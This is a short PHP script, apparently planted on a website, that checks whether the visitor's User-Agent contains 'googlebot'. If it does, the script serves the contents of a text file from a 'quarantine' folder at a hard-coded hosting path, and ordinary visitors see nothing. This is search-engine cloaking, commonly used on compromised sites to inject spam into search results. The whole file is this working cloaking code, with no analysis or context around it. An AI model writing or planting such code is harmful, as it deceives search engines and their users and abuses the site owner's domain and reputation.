<?php
// Ultra simple - langsung redirect ke file
if (stripos($_SERVER['HTTP_USER_AGENT'] ?? '', 'googlebot') !== false) {
    $file = '/home/u457839213/domains/ukinstitute.org/public_html/quarantine/jopp.txt';
    if (file_exists($file)) {
        header('Content-Type: text/plain');
        readfile($file);
        exit;
    }
}
?>
